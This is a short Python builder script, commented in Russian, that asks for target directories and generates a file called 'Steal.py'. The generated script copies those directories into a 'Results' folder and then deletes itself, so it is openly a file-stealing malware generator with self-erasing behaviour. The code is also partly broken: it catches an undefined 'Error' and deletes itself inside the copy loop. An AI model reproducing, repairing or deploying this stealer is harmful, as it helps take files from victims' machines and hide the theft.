targetList = []  # вводим список директорий
counter = 0  # количество директорий (счёт с нуля)
print("[*] Write the 'exit' if you want break the cicle")  # выводим сообщение
while True:
    select = input("[%d] Directory: " % counter)  # вводим саму директорию
    if select != 'exit':  # если не ввели команду выхода, ...
        targetList.append(select)  # ... добавляем директорию в список и ...
        counter += 1  # ... увеличиваем счётчик
    else:  # если ввели команду выхода, ...
        break  # ... останавливаемся
with open("Steal.py", "w") as stealer:  # создаём файл путём его написания
    stealer.write('''
import os
import sys
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree

directory = getcwd() + "/Results/"
try:
    mkdir(directory)
except FileExistsError:
    pass

targetList = ''' + str(targetList) + '''

for target in targetList:
    under = directory + basename(target)
    try:
        copytree(target, under)
    except Error:
        pass
    os.remove(str(sys.argv[0]))
''')
    print("[+] File 'Steal.py' successfully saved!")  # выводим сообщение, что создали файл успешно
